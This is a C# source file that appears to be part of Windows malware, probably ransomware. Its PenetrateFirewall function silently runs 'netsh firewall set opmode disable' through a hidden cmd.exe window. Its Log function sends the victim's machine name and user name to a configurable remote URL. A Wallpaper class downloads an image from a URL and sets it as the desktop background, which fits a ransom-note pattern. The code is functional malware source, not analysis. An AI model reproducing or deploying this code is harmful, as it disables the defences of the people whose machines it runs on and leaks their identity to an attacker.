using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;

namespace Main
{
    public static class Common
    {
        static bool _penetratedFirewall = false;
        public static bool penetratedFirewall
        {
            get
            {
                if (_penetratedFirewall) return true;
                else if (PenetrateFirewall())
                {
                    _penetratedFirewall = true;
                    return true;
                }
                return false;
            }
        }


        public static void Log(string message)
        {
            if (string.IsNullOrEmpty(Settables.LOGURL)) return;
            string info = Environment.MachineName + "-" + Environment.UserName + " : " + message;
            var fullUrl = Settables.LOGURL + info;

            if (!penetratedFirewall) return;

            using (WebBrowser client = new WebBrowser())
            {
                client.Navigate(fullUrl);
                while (client.ReadyState != WebBrowserReadyState.Complete)
                {
                    Application.DoEvents();
                }
            }
        }


        public static byte[] GetRandomBytes(int size)
        {
          int _saltSize = size;
          byte[] ba = new byte[_saltSize];
          RNGCryptoServiceProvider.Create().GetBytes(ba);
          return ba;
        }

        public static bool PenetrateFirewall()
        {
            string testie = "";
            using (System.Net.WebClient client = new System.Net.WebClient())
            {
                try
                {
                    testie = client.DownloadString("http://www.google.com/");
                    return true;
                }
                catch
                {
                    try
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "netsh firewall set opmode disable";
                        process.StartInfo = startInfo;
                        process.Start();

                        process.WaitForExit();
                        return true;
                    }
                    catch
                    {
                        return false;
                    }
                }
            }
        }
    }

  public sealed class Wallpaper
  {
      Wallpaper() { }

      const int SPI_SETDESKWALLPAPER = 20;
      const int SPIF_UPDATEINIFILE = 0x01;
      const int SPIF_SENDWININICHANGE = 0x02;

      [DllImport("user32.dll", CharSet = CharSet.Auto)]
      static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

      public enum Style : int
      {
          Tiled,
          Centered,
          Stretched
      }

      public static void Set(string uri, Style style)
      {
        try
        {
          System.IO.Stream s = new System.Net.WebClient().OpenRead(uri);

          System.Drawing.Image img = System.Drawing.Image.FromStream(s);
          string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
          img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

          RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
          if (style == Style.Stretched)
          {
              key.SetValue(@"WallpaperStyle", 2.ToString());
              key.SetValue(@"TileWallpaper", 0.ToString());
          }

          if (style == Style.Centered)
          {
              key.SetValue(@"WallpaperStyle", 1.ToString());
              key.SetValue(@"TileWallpaper", 0.ToString());
          }

          if (style == Style.Tiled)
          {
              key.SetValue(@"WallpaperStyle", 1.ToString());
              key.SetValue(@"TileWallpaper", 1.ToString());
          }

          SystemParametersInfo(SPI_SETDESKWALLPAPER,
              0,
              tempPath,
              SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        catch {}
    }
  }
}
